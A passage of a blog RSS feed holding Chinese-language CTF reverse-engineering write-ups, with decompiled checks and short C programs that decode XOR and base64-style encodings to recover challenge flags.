class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> a[] = &#123; <span class="number">0x66</span>,<span class="number">0x6D</span>,<span class="number">0x63</span>,<span class="number">0x62</span>,<span class="number">0x7F</span>,<span class="number">0x3A</span>,<span class="number">0x55</span>,<span class="number">0x6A</span>,<span class="number">0x39</span>,<span class="number">0x52</span>,<span class="number">0x7A</span>,<span class="number">0x37</span>,<span class="number">0x51</span>,<span class="number">0x13</span>,<span class="number">0x33</span>,<span class="number">0x23</span>,<span class="number">0x43</span>,<span class="number">0x46</span>,<span class="number">0x29</span>,<span class="number">0x3D</span>,<span class="number">0x29</span>,<span class="number">0x20</span>,<span class="number">0x7F</span>,<span class="number">0x1C</span>,<span class="number">0x26</span>,<span class="number">0x4D</span>,<span class="number">0x31</span>,<span class="number">0x14</span>,<span class="number">0x50</span>,<span class="number">0x5E</span>,<span class="number">-24</span> &#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> v8 = <span class="string">' '</span>; v8 &lt;= <span class="string">'&#125;'</span>; v8++)</span><br><span class="line"><span class="keyword">if</span> (!(v8 ^ i ^ (i + (i ^ a[i]))))</span><br><span class="line">flag[i] = v8;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>, flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="神光"><a href="#神光" class="headerlink" title="神光"></a>神光</h1><p><img src="https://ae01.alicdn.com/kf/Hcb2d63a279344df9a55fddec372de9b2q.png" alt=""></p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/05/04/36D%E6%9D%AF/#disqus_thread</comments>
    </item>
    
    <item>
      <title>DASCTF-安恒月赛</title>
      <link>https://usher2008.github.io/2020/04/26/DASCTF-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</link>
      <guid>https://usher2008.github.io/2020/04/26/DASCTF-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</guid>
      <pubDate>Sun, 26 Apr 2020 12:19:58 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
2020:4:25 pm 1:30-5:30
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>2020:4:25 pm 1:30-5:30<a id="more"></a></blockquote><h1 id="入门reverse"><a href="#入门reverse" class="headerlink" title="入门reverse"></a>入门reverse</h1><p>F5可以看见关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(&amp;input); ++i )</span><br><span class="line">      v6[i - <span class="number">112</span>] = (v6[i - <span class="number">112</span>] ^ <span class="number">6</span>) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(&amp;input, <span class="string">"akhb~chdaZrdaZudqduvdZvvv|"</span>) )</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"yes!you are right"</span>);</span><br></pre></td></tr></table></figure><p>并不知道v6[i - 112]是啥,但是因为这是简单题所以把它看作是输入,然后走一波,结果就flag就出来了,当然我们也可以动调去看一下,妥妥的是输入</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>]=<span class="string">"akhb~chdaZrdaZudqduvdZvvv|"</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(a);i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=(a[i]<span class="number">-1</span>)^<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="encrypt3"><a href="#encrypt3" class="headerlink" title="encrypt3"></a>encrypt3</h1><p>这个题分析可知,</p><ol><li>用户先输入一个魔法数字,这个数字是你后面输入的字符串长度的位数</li><li>输入一个字符串</li><li>他会将一个key的每一位与你的输入的每一位异或后输出(每一位都会异或所有你输入的字符串</li><li>所以爆破异或</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">100</span>]=<span class="string">"&amp;,!';#\"surq!$uvw#x&amp;ruq&amp;\"qrur$psvyp#%y="</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="string">' '</span>;i&lt;<span class="string">'&#125;'</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(b,a);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;<span class="built_in">strlen</span>(b);k++)</span><br><span class="line">b[k]=b[k]^i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>,b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="sm"><a href="#sm" class="headerlink" title="sm"></a>sm</h1><p>这题不会</p>]]></content:encoded>
      
      <comments>https://usher2008.github.io/2020/04/26/DASCTF-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/#disqus_thread</comments>
    </item>
    
    <item>
      <title>NPUCTF</title>
      <link>https://usher2008.github.io/2020/04/22/NPUCTF/</link>
      <guid>https://usher2008.github.io/2020/04/22/NPUCTF/</guid>
      <pubDate>Wed, 22 Apr 2020 12:12:58 GMT</pubDate>
      <description>
      
        &lt;blockquote&gt;
2020 4/18 09:00 - 2020 4/21 21:35
      
      </description>
      
      
      <content:encoded><![CDATA[<blockquote>2020 4/18 09:00 - 2020 4/21 21:35<a id="more"></a></blockquote><h1 id="are-you-a-fan"><a href="#are-you-a-fan" class="headerlink" title="are-you-a-fan"></a>are-you-a-fan</h1><p><a href="https://www.wootec.top/2020/04/21/Ha1cyon-CTF-%E8%8A%9C%E6%B9%96WP/" target="_blank" rel="noopener">这题不会做,参考了其他师傅的做的</a></p><p>获得了新知识<a href="https://www.jianshu.com/p/48fe4dd3e5ce" target="_blank" rel="noopener">base64隐写</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TableFind</span><span class="params">(<span class="keyword">char</span> ch)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> digit=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">line</span>[][<span class="number">100</span>]=&#123;<span class="string">"55y85YmN6YeN5aSN55qE6aOO5pmvLG=="</span>,</span><br><span class="line"><span class="string">"5riQ5riQ5qih57OK5LqG57qm5a6aLO=="</span>,</span><br><span class="line"><span class="string">"5pif56m65LiL5rWB5rWq55qE5L2gLH=="</span>,</span><br><span class="line"><span class="string">"5LuN54S256eY5a+G55qE6Led56a7LA=="</span>,</span><br><span class="line"><span class="string">"5rip5bqm5raI5aSx55qE556s6Ze0LH=="</span>,</span><br><span class="line"><span class="string">"5peg5rOV6Kem5pG455qE5piO5aSpLF=="</span>,</span><br><span class="line"><span class="string">"5rKh5pyJ5byV5Yqb55qE5LiW55WMLG=="</span>,</span><br><span class="line"><span class="string">"5rKh5pyJ6ISa5Y2w55qE5YWJ5bm0LD=="</span>,</span><br><span class="line"><span class="string">"6L+Y5Zyo562J552A5L2g5Ye6546wLH=="</span>,</span><br><span class="line"><span class="string">"5pel5pel5aSc5aSc6Ieq6L2s55qE6KGM5pifLE=="</span>,</span><br><span class="line"><span class="string">"5Yiw5aSE6YGu5ruh5Yir5Lq655qE6IOM5b2xLG=="</span>,</span><br><span class="line"><span class="string">"6K6p6aOO5ZC55pWj5re35Lmx55qE5ZG85ZC4LG=="</span>,</span><br><span class="line"><span class="string">"5b+r5b+r5riF6YaSfn=="</span>,</span><br><span class="line"><span class="string">"6Z2Z6Z2Z54Wn5Lqu5Y6f5p2l55qE6Ieq5bexLL=="</span>,</span><br><span class="line"><span class="string">"5aSp56m65rSS5ruh5b+954S255qE5YWJ5piOLE=="</span>,</span><br><span class="line"><span class="string">"55y85Lit5Y+q6KaB57ua54OC55qE5aSp6ZmFLG=="</span>,</span><br><span class="line"><span class="string">"5YaN6aOe6KGMIW=="</span>,</span><br><span class="line"><span class="string">"5oiR5YuH5pWi5Zyw5oqs6LW35aS0LM=="</span>,</span><br><span class="line"><span class="string">"55yL552A6Iyr6Iyr55qE5a6H5a6ZLH=="</span>,</span><br><span class="line"><span class="string">"5aSa5bCR5pyq55+l55qE5pif55CDLJ=="</span>,</span><br><span class="line"><span class="string">"5pyJ5rKh5pyJ6YCa5ZCR5pyq5p2l6Lev5Y+jLD=="</span>,</span><br><span class="line"><span class="string">"5Lqy54ix55qE5LyZ5Ly0LB=="</span>,</span><br><span class="line"><span class="string">"6K6p5oiR5Lus5LiA6LW354K554eDLG=="</span>,</span><br><span class="line"><span class="string">"5YuH5rCU5ZKM5L+h5b+1LO=="</span>,</span><br><span class="line"><span class="string">"5Zyo6YGl6L+c55qE5aSp6L65LG=="</span>,</span><br><span class="line"><span class="string">"6ZO25rKz6L6557yYLH=="</span>,</span><br><span class="line"><span class="string">"5pyJ5LiA54mH56We5aWH55qE5b2p6Jm55rW3LC=="</span>,</span><br><span class="line"><span class="string">"5ZKM5oiR5LiA6LW35YaS6ZmpLB=="</span>,</span><br><span class="line"><span class="string">"6aOe5ZCR5Y+m5LiA5Liq5LiW55WMLC=="</span>,</span><br><span class="line"><span class="string">"5Zyo6YGl6L+c55qE5aSp6L65LB=="</span>,</span><br><span class="line"><span class="string">"6ZO25rKz6L6557yYLC=="</span>,</span><br><span class="line"><span class="string">"5pyJ5LiA54mH56We5aWH55qE5b2p6Jm55rW3LB=="</span>,</span><br><span class="line"><span class="string">"5ZKM5oiR5LiA6LW35YaS6ZmpLH=="</span>,</span><br><span class="line"><span class="string">"6aOe5ZCR5Y+m5LiA5Liq5LiW55WMLN=="</span>,</span><br><span class="line"><span class="string">"c3VwZXIgbWFnaWMgd29ybGR+fg=="</span>,&#125;;</span><br><span class="line"><span class="keyword">int</span> t=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">35</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="built_in">line</span>[i]);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">line</span>[i][len<span class="number">-1</span>]!=<span class="string">'='</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">line</span>[i][len<span class="number">-2</span>]!=<span class="string">'='</span>)</span><br><span class="line">&#123;</span><br><span class="line">digit+=<span class="number">2</span>;</span><br><span class="line">temp=(temp&lt;&lt;<span class="number">2</span>)+(TableFind(<span class="built_in">line</span>[i][len<span class="number">-2</span>])&amp;<span class="number">0x3</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">digit+=<span class="number">4</span>;</span><br><span class="line">temp=(temp&lt;&lt;<span class="number">4</span>)+(TableFind(<span class="built_in">line</span>[i][len<span class="number">-3</span>])&amp;<span class="number">0xF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(digit==<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">digit=<span class="number">0</span>;</span><br><span class="line">flag[t++]=(<span class="keyword">char</span>)temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(digit&gt;<span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line">digit=<span class="number">2</span>;</span><br><span class="line">flag[t++]=(<span class="keyword">char</span>)(temp&gt;&gt;<span class="number">2</span>);</span><br><span class="line">temp&amp;=<span class="number">0x3</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">TableFind</span><span class="params">(<span class="keyword">char</span> ch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> table[]=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"><span class="keyword">int</span> len=<span class="built_in">strlen</span>(table);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="keyword">if</span>(ch==table[i])</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="BYBY-OBFUS"><a href="#BYBY-OBFUS" class="headerlink" title="BYBY_OBFUS"></a>BYBY_OBFUS</h1><p>简单题目,听说可以直接动调balabala,无所谓啦反正也挺简单的</p><p>丢入IDA,算了不放原来的F5代码了,直接放精简后的代码,里面的F0X12345都是比较简单的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key[]=&#123;<span class="number">0</span>,<span class="number">0x1E79</span>,<span class="number">0x1E79</span>,<span class="number">0x2135</span>,<span class="number">0x170D</span>,<span class="number">0x1F41</span>,<span class="number">0x1901</span>,<span class="number">0x2CED</span>,<span class="number">0x11F9</span>,<span class="number">0x2649</span>,<span class="number">0x2581</span>,<span class="number">0x2DB5</span>,<span class="number">0x14B5</span>,<span class="number">0x25E5</span>,<span class="number">0x2A31</span>,<span class="number">0x30D5</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> temp[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> table[]=&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> input[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%s"</span>, input);<span class="comment">//len=15</span></span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">&#123;</span><br><span class="line">    temp[j] = input[j<span class="number">-1</span>] - table[(j<span class="number">-1</span>) % <span class="number">4</span>];</span><br><span class="line">temp[j] ^= table[(j<span class="number">-1</span>) % <span class="number">4</span>];</span><br><span class="line">temp[j] *= <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( temp[k] == (key[k]<span class="number">-1</span>) / <span class="number">10</span> )</span><br><span class="line">      ++count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( count == <span class="number">15</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\nPASS"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp很容易写出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> key[]=&#123;<span class="number">0</span>,<span class="number">0x1E79</span>,<span class="number">0x1E79</span>,<span class="number">0x2135</span>,<span class="number">0x170D</span>,<span class="number">0x1F41</span>,<span class="number">0x1901</span>,<span class="number">0x2CED</span>,<span class="number">0x11F9</span>,<span class="number">0x2649</span>,<span class="number">0x2581</span>,<span class="number">0x2DB5</span>,<span class="number">0x14B5</span>,<span class="number">0x25E5</span>,<span class="number">0x2A31</span>,<span class="number">0x30D5</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> temp[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> table[]=&#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= <span class="number">15</span>; ++k )</span><br><span class="line">    temp[k] = (key[k]<span class="number">-1</span>) / <span class="number">100</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">15</span>;j&gt;=<span class="number">1</span>;j--)</span><br><span class="line">&#123;</span><br><span class="line">temp[j] ^= table[(j<span class="number">-1</span>) % <span class="number">4</span>];</span><br><span class="line">    flag[j<span class="number">-1</span>] = table[(j<span class="number">-1</span>) % <span class="number">4</span>] + temp[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h1><p>这个题看名字就知道是迷宫型</p><p>看F5就知道有49个格子,然后再分析一下就可以知道 h左 j上 l右 k下</p><p>然后就可以弄一个记事本打7*7个X然后能走的地方就O走到最右下角就成功</p><p>这个主要是他不是一次性提交走的位置,而是一个一个的键入的,如果是一次性输入完的话,要动调去看对了没有就比较麻烦</p><h1 id="RXencode"><a href="#RXencode" class="headerlink" title="RXencode"></a>RXencode</h1><p>F5的代码十分清晰,很容易看出输入经过base64换表后与key比较</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span>* str)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> key[]=&#123;<span class="number">0x9E</span>,<span class="number">0x9B</span>,<span class="number">0x9C</span>,<span class="number">0xB5</span>,<span class="number">0xFE</span>,<span class="number">0x70</span>,<span class="number">0xD3</span>,<span class="number">0x0F</span>,<span class="number">0xB2</span>,<span class="number">0xD1</span>,<span class="number">0x4F</span>,<span class="number">0x9C</span>,<span class="number">0x02</span>,<span class="number">0x7F</span>,<span class="number">0xAB</span>,<span class="number">0xDE</span>,<span class="number">0x59</span>,<span class="number">0x65</span>,<span class="number">0x63</span>,<span class="number">0xE7</span>,<span class="number">0x40</span>,<span class="number">0x9D</span>,<span class="number">0xCD</span>,<span class="number">0xFA</span>,<span class="number">0x00</span>&#125;;</span><br><span class="line"><span class="comment">//ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234&#123;&#125;789+/=</span></span><br><span class="line">decode(key);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decode</span><span class="params">(<span class="keyword">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> temp=<span class="built_in">strlen</span>(str)*<span class="number">4</span>/<span class="number">3</span>;</span><br><span class="line"><span class="keyword">char</span>* tempt=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(temp);</span><br><span class="line"><span class="built_in">memset</span>(tempt,<span class="number">0</span>,temp);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;j&lt;temp;i+=<span class="number">3</span>,j+=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">tempt[j]=(str[i]&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3F</span>;</span><br><span class="line">tempt[j+<span class="number">1</span>]=((str[i]&amp;<span class="number">3</span>)&lt;&lt;<span class="number">4</span>)|((str[i+<span class="number">1</span>]&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xF</span>);</span><br><span class="line">tempt[j+<span class="number">2</span>]=((str[i+<span class="number">1</span>]&amp;<span class="number">0xF</span>)&lt;&lt;<span class="number">2</span>)|((str[i+<span class="number">2</span>]&gt;&gt;<span class="number">6</span>)&amp;<span class="number">3</span>);</span><br><span class="line">tempt[j+<span class="number">3</span>]=str[i+<span class="number">2</span>]&amp;<span class="number">0x3F</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> table[<span class="number">67</span>]=<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234&#123;&#125;789+/="</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;temp;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]=table[tempt[i]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s"</span>,flag);</span><br><span class="line"><span class="built_in">free</span>(tempt);</span><br><span class="line"><span class="keyword">return</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="EAZYOBFU2"><a href="#EAZYOBFU2" class="headerlink" title="EAZYOBFU2"></a>EAZYOBFU2</h1><p>这个题目呢,源码级混淆</p><p>在源码里塞了2000个没用的操作输入的函数,然后在其中的某一个函数中添加了有用的代码</p><p>然而怎么就能够知道这2000个函数没有用呢,并且怎么知道是哪一个函数有用呢</p><p>出题人:我不知道</p><p>一个比较好的方法是用angr(我并不会用,没学py</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> keys[<span class="number">100</span>]=&#123;<span class="number">0x21</span>,<span class="number">0x3F</span>,<span class="number">0xA3</span>,<span class="number">0xE9</span>,<span class="number">0x8F</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span 